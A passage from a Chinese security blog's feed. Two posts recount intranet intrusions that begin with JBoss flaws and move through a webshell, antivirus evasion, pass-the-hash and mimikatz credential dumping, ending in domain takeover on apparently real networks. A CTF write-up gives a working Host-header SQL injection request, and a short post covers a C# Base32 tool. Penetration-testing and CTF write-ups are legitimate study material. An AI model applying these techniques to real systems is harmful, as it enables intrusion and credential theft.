title="分析"></a>分析</h3><ul><li>生成的马是免杀的（virustotal.com）；</li><li><code>Panda</code>动态查杀<code>mimikatz</code>；</li><li>存在<code>KB2871997</code>补丁（Administrator-500）；</li><li>执行命令无回显估计是因为地区语言的原因。</li></ul><h3 id="突破方法"><a href="#突破方法" class="headerlink" title="突破方法"></a>突破方法</h3><ul><li>生成新的<code>CS马</code>；</li><li>修改注册表；</li><li>使用<code>PsExec</code>进行<code>hash注入</code>；</li><li>对内网使用<code>MS-17-010</code>；</li><li>对内网的Web服务进行渗透。</li></ul><p><img src="/image/JBoss引起的内网渗透-3/JBoss-reg.png" alt=""></p><h2 id="横向拓展"><a href="#横向拓展" class="headerlink" title="横向拓展"></a>横向拓展</h2><h3 id="前奏"><a href="#前奏" class="headerlink" title="前奏"></a>前奏</h3><p>反弹个<code>metasploit</code>的shell，利用smb进行主机识别。但是失败，估计是在添加路由的时候出现错误，导致访问不到它的内网段。</p><p><img src="/image/JBoss引起的内网渗透-3/JBoss-CS.png" alt=""></p><p>已知条件：</p><ul><li>远控上线；</li><li><code>SZXzzAO-RxxxSY</code>各用户的<code>hash</code>。</li></ul><h3 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h3><p>想要横向，那就得需要知道域控为哪些，域管为哪些，域用户为哪些，内网机器存活为多少。这就关于到内网渗透定位技术问题。</p><p>常规的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net user /domain  # 存在数据</span><br><span class="line">net view /domain  # 该列表是空的</span><br><span class="line">net group /domain # 存在数据</span><br><span class="line">net group &quot;domain admins&quot; /domain # 无法找到组名称</span><br><span class="line">net time /domain # 存在数据</span><br><span class="line">net group &quot;domain controllers&quot; /domain # 无法找到组名称</span><br><span class="line">nltest /dclist:ALxxx.lxxxl # 存在数据</span><br></pre></td></tr></table></figure><p>以下内容是以上信息的综合：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">域控：</span><br><span class="line">SZXDC01  --&gt; 192.168.140.10</span><br><span class="line">SZXDC02  --&gt; 192.168.140.11</span><br></pre></td></tr></table></figure><p><img src="/image/JBoss引起的内网渗透-3/JBoss-CS-net-user-domain.png" alt=""></p><p>使用<code>Cobalt Strike</code>的ARP扫描（因为net view使用不了），使得<code>Targets</code>有记录。</p><p><img src="/image/JBoss引起的内网渗透-3/JBoss-CS-arp.png" alt=""></p><p>接下来就是找域管理员，既然不知道组名称，那就先找组名，过程参考<a href="http://www.mottoin.com/92978.html" target="_blank" rel="noopener">内网渗透测试定位技术总结</a>。</p><p><img src="/image/JBoss引起的内网渗透-3/JBoss-CS-user-domain.png" alt=""></p><p>完成！</p><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>用比较典型的<code>hash注入</code>碰一下看看运气怎么样。由于存在<code>KB2871997</code>补丁，所以只能使用<code>administrator用户</code>进行注入。</p><p>登陆情况如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.140.10 # 失败</span><br><span class="line">192.168.140.11 # 失败</span><br><span class="line">192.168.140.14 # 成功</span><br><span class="line">....</span><br><span class="line">192.168.140.57 # 成功</span><br><span class="line">192.168.140.78 # 失败</span><br><span class="line">192.168.140.160 # 成功</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p><img src="/image/JBoss引起的内网渗透-3/JBoss-CS-psh.png" alt=""></p><p>这个过程就是不断的进行<code>hash注入</code>，不断的<code>dump密码</code>，结果就如上图。看<code>Credentials</code>里是否存在域管用户账密。</p><p><img src="/image/JBoss引起的内网渗透-3/JBoss-CS-mimikatz.png" alt=""></p><p>成功获取到域管的账号密码。进行登陆。</p><p><img src="/image/JBoss引起的内网渗透-3/JBoss-CS-DC1.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;待人如知己！！！&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>JBoss引起的内网渗透-2</title>
    <link href="https://rcoil.me/2018/03/JBoss%E5%BC%95%E8%B5%B7%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-2/"/>
    <id>https://rcoil.me/2018/03/JBoss引起的内网渗透-2/</id>
    <published>2018-03-14T00:28:58.000Z</published>
    <updated>2018-03-16T04:45:26.612Z</updated>
    
    <content type="html"><![CDATA[<p>待人如知己！！</p><a id="more"></a><p>说明：<br>本文中有个错误的概念验证，在判断域管理员的时候不能这么判断的，是不合理的。主要原因是在实操的时候，刚好能够使用Administrator用户密码登陆域，所以文章中就这么下结论了。这只是一个小概率事件，不成定律。</p><h2 id="切入点"><a href="#切入点" class="headerlink" title="切入点"></a>切入点</h2><p>Jboss的反序列化漏洞，接下来看站点信息</p><p><img src="/image/JBoss引起的内网渗透-2/jboss-admin-console.png" alt=""></p><p>正常来说这个<code>admin-console</code>及<code>web-console/</code>都是能正常访问的，就算不能正常访问也不会是<code>404状态</code> ，所以为了搞清楚原因，去翻了其目录，进行对比。发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">server\default\deploy  #默认部署war目录</span><br><span class="line">server\web\deploy  # 部署war相对应的编译生成目录</span><br></pre></td></tr></table></figure><p>两个目录中，在<code>\web\deploy\</code>中缺少了<code>admin-console</code>和<code>web-console</code>，所以原因是：管理员在安装了<code>JBoss后</code>，为了安全起见，就在<code>server\web\deploy</code>删除了<code>admin-console.war</code>和<code>web-console.war</code>，所以在部署目录下是存在war包，但是编译目录下是不存在的。</p><p>所以接下来就进行常规的war部署，发现war已经上传上去了，但是访问出现404，所以跑去<code>server\web\deploy</code>查看，发现是没有生成相对应的文件夹，原因暂时未知。</p><p>所以就直接将jsp脚本上传到了<code>jmx-console.war</code>当中，成功获取<code>WebShell</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">server\default\deploy\jmx-console.war\  # 上传访问失败</span><br><span class="line">server\web\deploy\jmx-console.war\  # 上传访问成功</span><br></pre></td></tr></table></figure><p><img src="/image/JBoss引起的内网渗透-2/jboss-webshell.png" alt=""></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>接下来又是常规的信息收集</p><p>发现在菜刀里面执行命令，多数都是超时状态，所以还是回到之前的工具进行执行或是上传个命令执行马或是用web访问马。</p><p><img src="/image/JBoss引起的内网渗透-2/jboss-ipconfig-all.png" alt=""></p><p><img src="/image/JBoss引起的内网渗透-2/jboss-net-view.png" alt=""></p><p><img src="/image/JBoss引起的内网渗透-2/jboss-systeminfo.png" alt=""></p><p>进程里面是存在<code>avguard.exe</code>，所以需要做免杀。系统是windows xp-x86。</p><p>在查看环境变量的时候发现是存在<code>powershell</code>的,但是没起作用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">net user #查看本机用户</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    HelpAssistant            </span><br><span class="line">postgres                 saverio                  SUPPORT_388945a0   </span><br><span class="line"></span><br><span class="line">net group &quot;domain admins&quot; /domain  #查看域管理员</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            bckagent                 dbagent                  </span><br><span class="line">faxmaker                 idsmessina               lattuca                  </span><br><span class="line">SpaceGuardSvcAccnt       trovato                  VMwareVDPBackupUser      </span><br><span class="line"></span><br><span class="line">net group &quot;domain controllers&quot; /domain  #查看域控制器</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">DOMAIN1$                 DOMAIN2$    </span><br><span class="line"></span><br><span class="line">域用户就不列举了，实在有些多</span><br></pre></td></tr></table></figure><p>信息收集到这里，就有些蹊跷，因为本机用户里面，除了<code>Administrator</code>存在于域用户中，其余的账户均不见，所以这里能直接判断<code>Administrator</code>就是域管理员。</p><p>综合以上信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DOMAIN2 - 192.168.20.10 # 域控制器</span><br><span class="line">PROTRIBUTCT -Administrator # 域管理员</span><br><span class="line">avguard.exe # 小红伞杀软</span><br><span class="line">powershell # 不可用</span><br></pre></td></tr></table></figure><h2 id="小小免杀"><a href="#小小免杀" class="headerlink" title="小小免杀"></a>小小免杀</h2><p>续上次的<code>shellter</code>免杀，是过不了小红伞的，所以，这种时候，该储备的东西就起作用了。</p><p><img src="/image/JBoss引起的内网渗透-2/jboss-2.png" alt=""></p><p>生成一个Metasploit的马，去<code>Virustotal</code>做测试免杀，是过了AVG的，所以尝试一波。但是，生成的exe在windows 7下面是能正常执行的，但是到了xp上面就不行了。</p><p>用Veil生成个吧，安装Veil也是个大坑，图就不放了。</p><h2 id="横向内网"><a href="#横向内网" class="headerlink" title="横向内网"></a>横向内网</h2><p>接下来思路就很明确了。将PROTRIBUTCT的密码dump下来，幸运的话整个域就能拿下来了。</p><p><img src="/image/JBoss引起的内网渗透-2/jboss-Cobalt-Strike.png" alt=""></p><p>至此，这个域已经拿下，比上篇难度相对来说要小一些。</p><p>还有一个点，就是在查看域控的时候发现是有两台的，也是一样的登陆方式进行登陆即可。但是在这两台域控执行<code>net view /domain:xxxxx</code>结果都是不一样的，这也许就是两台域控的缘故吧。但是DOMAIN1所在的段只能通过DOMAIN2出来，其他机器做跳板均没数据，或许这是玄学了吧。</p><p>至此，整个测试流程就结束了。整个过程有点顺利，不是我发blog的初衷。</p><p><img src="/image/JBoss引起的内网渗透-2/JBoss引起的内网渗透-2.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;待人如知己！！&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>P牛的红包口令</title>
    <link href="https://rcoil.me/2018/02/P%E7%89%9B%E7%9A%84%E7%BA%A2%E5%8C%85%E5%8F%A3%E4%BB%A4/"/>
    <id>https://rcoil.me/2018/02/P牛的红包口令/</id>
    <published>2018-02-18T01:26:22.000Z</published>
    <updated>2018-02-24T18:35:44.142Z</updated>
    
    <content type="html"><![CDATA[<p>这个口令红包没领成。</p><a id="more"></a><p>新年新气象，逛圈子偶遇到P牛发的一个红包。</p><p>题目如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2018.mhz.pw:62231</span><br></pre></td></tr></table></figure><h2 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h2><p>使用浏览器访问题目，发现无法访问，且提示为<code>ERR_INVALID_HTTP_RESPONSE</code>，那就说明这个端口并不是<code>HTTP协议</code>的服务。</p><p>使用端口指纹识别：</p><p><img src="/image/P牛的红包口令/nmap.png" alt="nmap"></p><p><code>rsync</code>是linux系统下的数据镜像备份工具。所以我们得去了解一下<code>rsync</code>的基本语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">列远程机的文件列表。这类似于rsync传输，不过只要在命令中省略掉本地机信息即可。如：rsync -v rsync://2018.mhz.pw:62231</span><br><span class="line">从远程rsync服务器中拷贝文件到本地机。如：rsync -av rsync://2018.mhz.pw:62231/www /databack</span><br></pre></td></tr></table></figure><h2 id="源码拉取"><a href="#源码拉取" class="headerlink" title="源码拉取"></a>源码拉取</h2><p><img src="/image/P牛的红包口令/rsync.png" alt="rsync"></p><p>将<code>git</code>裸仓库进行还原</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone pwnhub_6670.git/</span><br></pre></td></tr></table></figure><p><img src="/image/P牛的红包口令/git.png" alt="git"></p><p>需要审计的源码还原成功，但是本地搭建没成功，得修改修改（环境问题）。</p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>文件列表如下：</p><p><img src="/image/P牛的红包口令/pwnhub.png" alt="pwnhub"></p><p>初略看了下，只有一个登录框。</p><p>那还是读源码吧。从<code>index.php</code>    跳转至<code>cpre.php</code>，先看这份<code>PHP代码</code>。</p><p>从开始都是一些常规的全局设置。再往下看。</p><p>目标站点只有简单的登陆功能，相关代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">escape($_REQUEST); # 转义</span><br><span class="line">escape($_POST);</span><br><span class="line">escape($_GET);</span><br><span class="line"></span><br><span class="line">function escape(&amp;$arg) &#123;</span><br><span class="line">    if(is_array($arg)) &#123; # 判断$arg是否为数组</span><br><span class="line">        foreach ($arg as &amp;$value) &#123; # 遍历$arg数组。每次循环中，当前单元的值被赋给$value并且数组内部的指针向前移一步。</span><br><span class="line">            escape($value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $arg = str_replace([&quot;&apos;&quot;, &apos;\\&apos;, &apos;(&apos;, &apos;)&apos;], [&quot;‘&quot;, &apos;\\\\&apos;, &apos;（&apos;, &apos;）&apos;], $arg); # 将$arg内的单引号、小括号转换成中文符号，将反斜杠进行转义。</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function arg($name, $default = null, $trim = false) &#123;</span><br><span class="line">    if (isset($_REQUEST[$name])) &#123;# 检查$_REQUEST中是否存在$name值</span><br><span class="line">        $arg = $_REQUEST[$name];</span><br><span class="line">    &#125; elseif (isset($_SERVER[$name])) &#123; # 检查$_SERVER中是否存在$name值</span><br><span class="line">        $arg = $_SERVER[$name];</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $arg = $default;</span><br><span class="line">    &#125;</span><br><span class="line">    if($trim) &#123;</span><br><span class="line">        $arg = trim($arg);</span><br><span class="line">    &#125;</span><br><span class="line">return $arg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在检测的<code>$name</code>值当中，<code>$_SERVER</code>很明显并没有被转义处理。或许我们能利用这一个点。</p><p>再往下看代码、来到了<code>Controller</code>类。分了<code>BaseController.php</code>和<code>MainController.php</code>，它们是继承关系。在<code>MainController.php</code>看到了三个函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">actionIndex() #主页</span><br><span class="line">actionLogin() #登陆 (正常验证)</span><br><span class="line">actionRegister() #注册</span><br></pre></td></tr></table></figure><p>看到这里我才知道是有注册功能的。下面来看看<code>actionRegister</code>的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">function actionRegister()&#123;</span><br><span class="line">    if ($_POST) &#123;</span><br><span class="line">        $username = arg(&apos;username&apos;); # 检查是否存在</span><br><span class="line">        $password = arg(&apos;password&apos;);</span><br><span class="line"></span><br><span class="line">        if (empty($username) || empty($password)) &#123;  # 判断用户密码是否为空</span><br><span class="line">            $this-&gt;error(&apos;Username or password is empty.&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $email = arg(&apos;email&apos;); # 检查是否存在</span><br><span class="line">        if (empty($email)) &#123; # 如果email为空，则email由输入的用户名、@及HOST组合而成</span><br><span class="line">            $email = $username . &apos;@&apos; . arg(&apos;HTTP_HOST&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123; # FILTER_VALIDATE_EMAIL过滤器</span><br><span class="line">            $this-&gt;error(&apos;Email error.&apos;); </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $user = new User(); # 判断用户名是否存在</span><br><span class="line">        $data = $user-&gt;query(&quot;SELECT * FROM `&#123;$user-&gt;table_name&#125;` WHERE `username` = &apos;&#123;$username&#125;&apos;&quot;);</span><br><span class="line">        if ($data) &#123; </span><br><span class="line">            $this-&gt;error(&apos;This username is exists.&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ret = $user-&gt;create([ # 向users表中插入数据</span><br><span class="line">            &apos;username&apos; =&gt; $username,</span><br><span class="line">            &apos;password&apos; =&gt; md5($password),</span><br><span class="line">            &apos;email&apos; =&gt; $email</span><br><span class="line">        ]);</span><br><span class="line">        if ($ret) &#123;</span><br><span class="line">            $_SESSION[&apos;user_id&apos;] = $user-&gt;lastInsertId();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;error(&apos;Unknown error.&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>能利用的点就是email的组成元素(HTTP_HOST)，而<code>HTTP_HOST</code>又是由<code>arg函数</code>获取的，也就是说可以从没有被转义的<code>$_SERVER</code>着手。既然是数据库操作，那就看看是否能构造语句使之形成<code>SQL注入漏洞</code>。</p><p>先明确一点：Email由<code>用户名</code>、<code>@</code>、<code>Host</code>三者拼接而成，而<code>Host</code>可利用的点为<code>$_SERVER</code>。</p><p>但是其中有个<code>FILTER_VALIDATE_EMAIL过滤器</code>，所以首先还是得绕过这个过滤器。</p><h2 id="绕过过滤器"><a href="#绕过过滤器" class="headerlink" title="绕过过滤器"></a>绕过过滤器</h2><p>第一次见到<code>FILTER_VALIDATE_EMAIL</code>是在PHPMailer的<code>CVE-2016-10033</code>里面遇到的，当时还是用着<code>wordpress</code>博客程序。</p><p><img src="/image/P牛的红包口令/email.png" alt="email"></p><p>这样就能引入了引号，又符合过滤器的规则。那我们就传入用户名为<code>&quot;qqq</code>，Host为<code>rcoil&#39;&quot;@rcoil.me</code>进行注册。因为邮箱中包含单引号，所以必会造成<code>SQL注入</code>。</p><h2 id="构造SQL注入"><a href="#构造SQL注入" class="headerlink" title="构造SQL注入"></a>构造SQL注入</h2><p>将<code>Host</code>进行修改，结果如下：</p><p><img src="/image/P牛的红包口令/request-0.png" alt="request-0"></p><p>404错误，并不是我们想象中的情景。之前做CTF的时候有过这类型的情况，添加多一个<code>Host</code>就可以了。如图：</p><p><img src="/image/P牛的红包口令/request-1.png" alt="request-1"></p><p>既然构成了SQL注入，那就看看怎么利用了。</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>在源码中有分sql备份文件，从里面能看到SQL的结构。</p><p>最后卡在了这个报错注入里面。</p><h2 id="P牛的WriteUP"><a href="#P牛的WriteUP" class="headerlink" title="P牛的WriteUP"></a>P牛的WriteUP</h2><p><a href="https://www.leavesongs.com/PENETRATION/some-tricks-of-attacking-lnmp-web-application.html#0x04-nginx-host" target="_blank" rel="noopener">攻击LNMP架构Web应用的几个小Tricks</a></p><p>知识点还是掌握得不够，静下心来好好学习。</p><p>看了P牛的WriteUp，才注意到<code>create</code>方法就是拼接了一个<code>INSERT</code>语句，而且报错信息也没仔细看。</p><p>现在回过头来想想，确实就是这么一回事。在插入的过程中，闭合了前段语句，再新建一个语句插入自己定义的语句，就能在可控的范围内获取自己所需要的信息。翻了翻之前的笔记。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use test;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT @@version;</span><br><span class="line">+-----------+</span><br><span class="line">| @@version |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.5.53    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from demo;</span><br><span class="line">+------+------+------+</span><br><span class="line">| demo | test | aoao |</span><br><span class="line">+------+------+------+</span><br><span class="line">| d    | d    | d    |</span><br><span class="line">+------+------+------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT into demo VALUES(&apos;A&apos;,&apos;A&apos;,&apos;A&apos;),(&apos;B&apos;,&apos;B&apos;,&apos;B&apos;);</span><br><span class="line">Query OK, 2 rows affected</span><br><span class="line">Records: 2  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from demo;</span><br><span class="line">+------+------+------+</span><br><span class="line">| demo | test | aoao |</span><br><span class="line">+------+------+------+</span><br><span class="line">| d    | d    | d    |</span><br><span class="line">| A    | A    | A    |</span><br><span class="line">| B    | B    | B    |</span><br><span class="line">+------+------+------+</span><br><span class="line">4 rows in set</span><br></pre></td></tr></table></figure><p>然后我们构造一下语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /main/register HTTP/1.1</span><br><span class="line">Host: 2018.mhz.pw</span><br><span class="line">Host: rcoil&apos;),(&apos;ao123&apos;,md5(121314),(select(flag)from(flags)))#&quot;@rcoil.me</span><br><span class="line">Content-Length: 34</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://2018.mhz.pw</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://2018.mhz.pw/main/register</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=bvdrraji3mjirt5noljghm8ib7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username=&quot;qq&amp;email=&amp;password=aaaaa</span><br></pre></td></tr></table></figure><p>闭合了前段的<code>INSERT语句</code>，并新建了一条语句，在<code>email</code>字段将<code>flag</code>读取。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个口令红包没领成。&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="https://rcoil.me/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="https://rcoil.me/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://rcoil.me/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>编码转换工具 （C#入门）</title>
    <link href="https://rcoil.me/2018/01/%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7/"/>
    <id>https://rcoil.me/2018/01/编码转换工具/</id>
    <published>2018-01-03T07:11:51.000Z</published>
    <updated>2018-01-03T13:35:47.978Z</updated>
    
    <content type="html"><![CDATA[<p>一直想写一些图形化工具来用。从小入手，写了个计算器，看了下代码，有点麻瓜。</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">工具：编码转换工具</span><br><span class="line">编译：VS2015 C#(.NET Framework v4.0)</span><br></pre></td></tr></table></figure><p>先看一下效果图：</p><p><img src="/image/编码转换工具/2018-01-03_15-54-01.png" alt="2018-01-03_15-54-01"></p><p>其中有个bug，就是<code>ASCii</code>不归零，也不知道是怎么回事。</p><p>默认的<code>textBox</code>获取方式为<code>Encoding.Default.GetBytes(str)</code>，注意的是要使用<code>UTF8</code>，代码有些丑陋，就不贴了。</p><p>在写到<code>Base32</code>的时候，没找到现成的方法可以直接利用，所以就去了解了下、</p><p><code>Base32</code>是由<code>ABCDEFGHIJKLMNOPQRSTUVWXYZ234567</code>组成的,由于<code>0</code>和<code>1</code>由于与字母<code>O</code>和<code>I</code>相似性而被跳过。</p><p>规则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">任意给定一个二进制数据，以5个位(bit)为一组进行切分(base64以6个位(bit)为一组)</span><br><span class="line">对切分而成的每个组进行编码得到1个可见字符。</span><br></pre></td></tr></table></figure><p>演示：（以<code>rcoil</code>字符串进行编码）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">字符rcoil取ASCII码之后，对其转换成二进制（切5补0）得到</span><br><span class="line">01110,01001,10001,10110,11110,11010,01011,01100</span><br><span class="line">计算每组二进制对应的十进制，然后参考Base32编码表，组成密文</span><br></pre></td></tr></table></figure><p><img src="/image/编码转换工具/2018-01-03_17-51-05.png" alt="2018-01-03_17-51-05"></p><p>具体的算法就是这样，有了流程就可以写代码了。</p><p>后来找了找，能找到一些别人已经写好的类。<a href="https://stackoverflow.com/questions/641361/base32-decoding" target="_blank" rel="noopener">Base32 Decoding</a>，直接利用就可以了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一直想写一些图形化工具来用。从小入手，写了个计算器，看了下代码，有点麻瓜。&lt;/p&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>MySQL-盲注浅析</title>
    <link href="https://rcoil.me/2017/11/MySQL-%E7%9B%B2%E6%B3%A8%E6%B5%85%E6%9E%90/"/>
    <id>https://rcoil.me/2017/11/MySQL-盲注浅析/</id>
    <published>2017-11-04T06:38:39.000Z</published>
    <updated>2018-04-18T02:07:40.757Z</updated>
    
